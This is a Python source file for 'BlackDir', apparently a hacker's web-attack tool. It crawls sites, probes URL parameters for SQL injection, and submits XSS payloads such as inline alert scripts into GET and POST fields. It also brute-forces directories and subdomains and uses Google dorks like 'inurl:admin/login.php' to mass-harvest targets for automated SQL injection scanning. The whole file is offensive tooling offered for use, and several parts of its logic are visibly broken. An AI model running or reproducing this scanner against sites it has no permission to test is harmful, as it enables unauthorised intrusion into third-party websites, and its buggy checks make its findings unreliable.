from bs4 import BeautifulSoup
from urllib import request
from urllib.parse import urlsplit, parse_qs
from urllib import error
from termcolor import colored
import requests
import argparse
import googlesearch
import os
import time
def logo():
    print("""
\x1b[30m
 ____  _            _    ____  _      
| __ )| | __ _  ___| | _|  _ \(_)_ __ 
|  _ \| |/ _` |/ __| |/ / | | | | '__|
| |_) | | (_| | (__|   <| |_| | | |   
|____/|_|\__,_|\___|_|\_\____/|_|_| version:0.8
  
help: python3 BlackDir.py -h
==================================================
C0ded By RedVirus[@redvirus0] & Sherlouk[@2r11]                                                                                           
""")


def fast_crawl(url):
    global list_direct, url_access, url_pure
    list_direct_pure = []
    list_direct = []

    if "https" in url or "http" and "www":
        url_pure = url.strip("https://www.")
    elif "https" or "http":
        url_pure = url.strip("https://")
    list_direct.append(url)
    url_request = request.urlopen(url)
    url_source = BeautifulSoup(url_request, "html.parser")
    for link in url_source.find_all("a"):
        link_pure = link.get("href")
        if "http" in link_pure or "www." in link_pure or "@" in link_pure or "#" in link_pure or " " in link_pure:
            pass
        else:
            if link_pure == "":
                pass
            else:
                if link_pure in list_direct:
                    pass
                else:
                    url_generate = url + "/" + link_pure
                    if url_generate in list_direct:
                        pass
                    else:
                        list_direct.append(url + "/" + link_pure)
    for sec_url in list_direct:
        url_request = request.urlopen(sec_url).read()
        url_source = BeautifulSoup(url_request,"html.parser")
        for urls in url_source.findAll("a"):
            urls_find = urls.get("href")
            if "#" in urls_find or " " in urls_find or "http" in urls_find or "https" in urls_find or "www" in urls_find or "@" in urls_find:
                pass
            else:
                urls_avi = url+"/"+urls_find
                if urls_avi in list_direct:
                    pass
                else:
                    if urls_find == None or urls_find == " ":
                        urls_find.strip()
                        pass
                    else:
                        if urls_find == "":
                            pass
                        else:
                            list_direct_pure.append(url+"/"+urls_find)
    for urls_error in list_direct_pure:
        if urls_error in list_direct:
            pass
        else:
            list_direct.append(urls_error)
    for urls_final in list_direct:
        print(colored("Found[+]\n"+urls_final,"green"))
    print(colored("Fast spider Done ..","red"))
def sql(url):  # Function F0r find Sql_Injection
    global equal_parameter, keys, equal_par, response
    fast_crawl(url)
    for urls in list_direct:
        query = urlsplit(urls).query
        parameter = parse_qs(query)
        url_request = request.urlopen(urls).read()
        url_source = BeautifulSoup(url_request,"html.parser")
        values = list(parameter.values())
        for index,item in enumerate(values):
            equal_par = values[index]
            for i in equal_par:
                equal_parameter = str(i+"'")
                keys = list(parameter.keys())
            for index,item in enumerate(keys):
                parmeter_name = keys[index]
                parmeter_name = str(parmeter_name)
                post_sql = {}
                post_sql[parmeter_name] = equal_parameter
                response = requests.get(urls,post_sql)
            if url_source != response.text:
                print("Information: ")
                print(colored("SQL Injection","red"),colored("Type:Union Based","grey"))
                print("Url Vulnerable:",urls)
            else:
                pass

def sql_dorks(url):
    global equal_parameter, response, keys
    try:

        query = urlsplit(url).query
        parameter = parse_qs(query)
        url_request = request.urlopen(url).read()
        url_source = BeautifulSoup(url_request,"html.parser")
        values = list(parameter.values())
        for index,item in enumerate(values):
            equal_par = values[index]
            for i in equal_par:
                equal_parameter = str(i+"'")
                keys = list(parameter.keys())
            for index,item in enumerate(keys):
                parmeter_name = keys[index]
                parmeter_name = str(parmeter_name)
                post_sql = {}
                post_sql[parmeter_name] = equal_parameter
                response = requests.get(url,post_sql)
            if url_source != response.text:
                print("Information: ")
                print(colored("SQL Injection","red"),colored("Type:Union Based","grey"))
                print("Url Vulnerable:",url)
            else:
                pass
    except error.HTTPError:
        pass
def xss(url):  #Function FOr Find xss vulnerability
    fast_crawl(url)
    global payload
    print(colored("Please Wait We Scanning . .", "red"))
    time.sleep(2)
    for url_direct in list_direct:
        print(colored("We Scanning This Url: ", "grey"), colored(url_direct, "green"))
        time.sleep(2)
        payloads = open("xss_payloads.txt", "r")
        query = urlsplit(url).query
        params = parse_qs(query)
        kyes = list(params.keys())
        single_cotation = "'"
        slash = "//"
        double_cotation = '"'
        symbol = ">"
        post_data_get = {}
        post_data_post = {}
        for payload in payloads:
            payload = payload.strip()
            for index, item in enumerate(kyes):
                if payload == "; alert(1);":
                    payload = single_cotation + payload
                    post_data_get[kyes[index]] = payload
                    response = requests.get(url_direct, params=post_data_get)
                    if payload in response.text:
                        print(colored("[!] Is Vulnerable [xss] Payload >> {}", "green").format(payload))
                        print("Url Vulnerable", response.url)
                        print(colored("Method:", "red") + colored("GET", "grey"))
                        print("--------------------------------------------------------")
                    else:
                        print(colored("This Payload Not in Source: Payload >> {}", "red").format(payload))
                        print(colored("[!] Method:", "red") + colored("GET", "grey"))
                        print("--------------------------------------------------------")
                elif payload == ")alert(1);":
                    payload = single_cotation + payload + slash
                    post_data_get[kyes[index]] = payload
                    response = requests.get(url_direct, params=post_data_get)
                    if payload in response.text:
                        print(colored("[!] Is Vulnerable [xss] Payload >> {}", "green").format(payload))
                        print("Url Vulnerable", response.url)
                        print(colored("Method:", "red") + colored("GET", "grey"))
                        print("--------------------------------------------------------")
                    else:
                        pass
                elif payload == '<IMG SRC=”javascript:alert(123);':
                    payload = payload + double_cotation + symbol
                    post_data_get[kyes[index]] = payload
                    response = requests.get(url_direct, params=post_data_get)
                    if payload in response.text:
                        print(colored("[!] Is Vulnerable [xss] Payload >> {}", "green").format(payload))
                        print("Url Vulnerable", response.url)
                        print(colored("Method:", "red") + colored("GET", "grey"))
                        print("--------------------------------------------------------")
                    else:
                        pass

                else:
                    post_data_get[kyes[index]] = payload
                    response = requests.get(url_direct, params=post_data_get)
                    if payload in response.text:
                        print(colored("[!] Is Vulnerable [xss] Payload >> {}", "green").format(payload))
                        print("Url Vulnerable", response.url)
                        print(colored("Method:", "red") + colored("GET", "grey"))
                        print("--------------------------------------------------------")
                    else:
                        pass
            url_content = request.urlopen(url_direct).read()
            inputs = BeautifulSoup(url_content, "html.parser")
            for inputs_form in inputs.find_all("input"):
                if inputs_form in inputs.find_all("input"):
                    if inputs_form.get('type') == "submit":
                        input_submit = inputs_form.get('name')
                        post_data_post[input_submit] = inputs_form.get("value")
                    if inputs_form.get('type') == 'text':
                        input_name = inputs_form.get('name')
                        post_data_post[input_name] = payload
            response = requests.post(url, post_data_post)  # POST
            if payload in response.text:
                print(colored("Information:", "grey"))
                print("")
                print(colored("[!] Url Vulnerable {}", "green").format(url))
                print("--------------------------------------------------------")
                print(colored("[!] Is Vulnerable [xss] Payload >> {}", "green").format(payload))
                print("--------------------------------------------------------")
                print(colored("[!] Method:", "red") + colored("POST", "grey"))
                print("--------------------------------------------------------")
                print(colored("Source:", "green"))
                print("")
                print(response.text)
                print("--------------------------------------------------------")
            else:
                pass
def spider(url, lists):
    fast_crawl(url)
    print(colored("We Crawling By This File >>"+os.getcwd()+"/"+"list.txt","grey"))
    for i in lists:
        i = i.strip()
        Purl = url + "/" + i
        response = requests.get(Purl)
        if response.status_code == 200:
            print("\x1b[32mFound[+]")
            print(Purl)
        else:
            pass
    lists = open("list.txt", "r")
    if list_dir != None:
        print('Please Wait We Crawling This Directory ', colored(Purl, "red"))
        for direct in list_dir:
            for i in lists:
                Purl_New = direct + "/" + i
                new_response = requests.get(Purl_New)
                if new_response.status_code == 200:
                    list_dir.append(Purl_New)
                    print("\x1b[32mFound[+]")
                    print(Purl_New)
                else:
                    pass
    print(list_dir)


def dorks(dork, country, level, text):  # function for Get Dork
    global searching,list_url
    list_url = []
    if country == None:
        searching = dork + " " + text
    elif text == None:
        searching = dork + " " + country
    else:
        searching = dork + " " + country + " " + text
    print("Please Wait ...")
    search = googlesearch.search(searching, stop=level)
    for se in search:
        with open("Dorks.txt", "a+") as file:
            file.write("\n" + se)
    print("Directory of file: ", os.getcwd() + "/" + "Droks.txt")
    sql = input("You Want Scan All This Sites if Vulnerable SQL injection N/Y : ")
    if sql == "y" or sql == "Y" or sql == None:
            urls = open("Dorks.txt","r+")
            for i in urls:
                list_url.append(i)
    else:
        pass

def list_dorks(dork,level):
    global list_sql, dorks
    list_dork = []
    list_sql = []
    file = open(dork,"r+")
    for dorks in file:
        list_dork.append(dorks)
    file.close()
    for URL in list_dork:
        print(list_dork)
        print(colored("-------------------------------------------", "red"))
        print(colored("Dork:"+URL, "red"))
        print(colored("level: {}", "red").format(level))
        print(colored("-------------------------------------------","red"))
        searching = googlesearch.search(URL,stop=level)
        for search in searching:
            print(search)
            list_sql.append(search)
    for urls in list_sql:
        sql_dorks(urls)
def sub(url, subs):  #function for gussing subdomain
    for i in subs:
        i = i.strip()
        Purl = i + "." + url
        try:
            response = requests.get("http://" + Purl)
            if response.status_code == 200:
                print("http://" + Purl)
        except requests.exceptions.ConnectionError:
            pass


parser = argparse.ArgumentParser("""
--spider            : Url to find Directory
--list              : If you have list
--dork              : Dump all sites by dork
--level             : If you chose level for Dork [Default=20]
--country           : find Dork By Country
--text              : Dump site text if in site
--subdomain         : find SubDomain of site
--xss               : Scan Site if vulnerable [Xss]
--sql               : Scan Site if vulnerable [Sql]
--listDork          : Scan list Dorks if Vulnerable [Sql]
ex:
BlackDir.py --list /root/Desktop/list.txt --url http://google.com
BlackDir.py --dork inurl:admin/login.php --country site:uk --level 100
BlackDir.py --subdomain google.com
""")
parser.add_argument("-spider", "--spider")
parser.add_argument("-list", "--list")
parser.add_argument("-dork", "--dork")
parser.add_argument("-country", "--country")
parser.add_argument("-level", "--level")
parser.add_argument("-subdomain", "--subdomain")
parser.add_argument("-xss", "--xss")
parser.add_argument("-text", "--text")
parser.add_argument("-sql", "--sql")
parser.add_argument("-listDork","--listDork")
args = parser.parse_args()
unknown = parser.parse_known_args()
listuser = args.list
dork = args.dork
country = args.country
level = args.level
url = args.spider
subdomains = args.subdomain
scanner = args.xss
text = args.text
sql_inection = args.sql
list_dork = args.listDork
sublist = open("sub.txt", "r")
if level != None:
    level = level
else:
    level = 20
if country != None:
    site = country
else:
    site = " "
if listuser != None:
    lists = open(listuser, "r")
else:
    lists = open("list.txt", "r")

if dork != None and url == None and subdomains == None and scanner == None and sql_inection == None and list_dork == None:
    dorks(dork, site, int(level), text)
elif url != None and dork == None and subdomains == None and scanner == None and sql_inection == None and list_dork == None:
    spider(url, lists)
elif subdomains != None and url == None and dork == None and scanner == None and sql_inection == None and list_dork == None:
    sub(subdomains, sublist)
elif scanner != None and url == None and dork == None and subdomains == None and sql_inection == None and list_dork == None:
    xss(scanner)
elif sql_inection != None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None:
    sql(sql_inection)
elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork != None:
    list_dorks(list_dork,int(level))
else:
    logo()
